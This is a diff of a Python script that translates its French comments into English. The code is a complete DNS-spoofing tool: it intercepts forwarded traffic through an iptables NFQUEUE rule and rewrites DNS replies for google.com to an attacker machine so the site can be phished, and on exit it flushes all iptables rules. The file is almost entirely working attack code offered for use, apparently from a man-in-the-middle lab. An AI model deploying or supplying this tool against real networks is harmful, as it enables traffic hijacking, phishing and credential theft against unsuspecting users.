@@ -2,7 +2,7 @@ from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
 
-# enregistrements hosts DNS, ici on veut usurper google.com
+# DNS host records, for instance here, we want to spoof google.com
 dns_hosts = {
     b"google.com.": "192.168.40.113", # change this
     b"www.google.com.": "192.168.40.113", # this too
@@ -10,65 +10,65 @@ dns_hosts = {
 
 def process_packet(packet):
     """
-    Chaque fois qu'un nouveau paquet est redirigé vers netfilter queue,
-    ce callback est appelé.
+    Each time a new packet is redirected to the netfilter queue, this callback is called.
     """
-    # convertis un paquet de netfilter queue en paquet scapy
+    # convert a netfilter queue package into a scapy package
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
-        # Si le paquet est DNS : on le modifie
+        # If it's a DNS Packet : we modify it
         print("[BEFORE]:", scapy_packet.summary())
         try:
             scapy_packet = modify_packet(scapy_packet)
         except IndexError:
-            # pas de paquet UDP, il peut s'agir de paquets d'erreur IP/UDP.
+            # No UDP packet, they can be IP/UDP error packets.
             pass
         print("[AFTER]:", scapy_packet.summary())
-        # renvoyé comme paquet de netfilter queue
+        # returned as a netfilter queue packet
         packet.set_payload(bytes(scapy_packet))
-    # accepte le paquet
+    # accept the packet
     packet.accept()
 
 def modify_packet(packet):
     """
-    Modifie la réponse DNS pour la faire correspondre à notre dico `dns_hosts`
-    Par exemple, lorsqu'on a une réponse de google.com, cette fonction remplace 
-    l'adresse IP réelle par une fausse adresse IP (192.168.40.113).
+    Modifies the DNS response to match our `dns_hosts` dictionary. 
+    For example, when we get a response from google.com, 
+    this function replaces the real IP address with a fake IP address (192.168.40.113).
     """
-    # Obtenir le nom de domaine de la requête DNS
+    
+    # Get the domain name of the DNS request
     qname = packet[DNSQR].qname
     if qname not in dns_hosts:
-        # Si le site n'est pas dans notre liste de sites à phisher, on n'y touche pas
+        # If the site is not in our list of sites to phisher, we do not modify it
         print("NO MODIF", qname)
         return packet
-    # créer une nouvelle réponse, en remplaçant la réponse originale
-    # définir les rdata pour l'IP que nous voulons rediriger (spoofed)
-    # google.com -> 192.168.40.113 (machine kali)
+    # create a new response, replacing the original response
+    # set the rdata for the IP we want to redirect (spoofed)
+    # google.com -> 192.168.40.113 (kali machine)
     packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
-    # définir le nombre de réponses à 1
+    # set the number of answers to 1
     packet[DNS].ancount = 1
-    # supprimer les sommes de contrôle et la longueur du paquet, parce que nous avons modifié le paquet
-    # de nouveaux calculs sont nécessaires (scapy le fera automatiquement)
+    # remove the checksums and the length of the package, because we have modified the package
+    # new calculations are needed (scapy will do it automatically)
     del packet[IP].len
     del packet[IP].chksum
     del packet[UDP].len
     del packet[UDP].chksum
-    # retourne le paquet modifié
+    # return the modified packet
     return packet
 
 
 
 if __name__ == "__main__":
     QUEUE_NUM = 0
-    # insérer la règle iptables FORWARD
+    # insert iptables FORWARD rule
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
-    # instancie netfilter queue
+    # instantiate netfilter queue
     queue = NetfilterQueue()
     try:
-        # lier le queue number à notre callback `process_packet`.
-        # et le lancer
+        # bind the queue number to our `process_packet` callback
+        # and run it
         queue.bind(QUEUE_NUM, process_packet)
         queue.run()
     except KeyboardInterrupt:
-        # fin du programme on fait iptables flush
+        # end of the program, we do iptables flush
         os.system("iptables --flush")
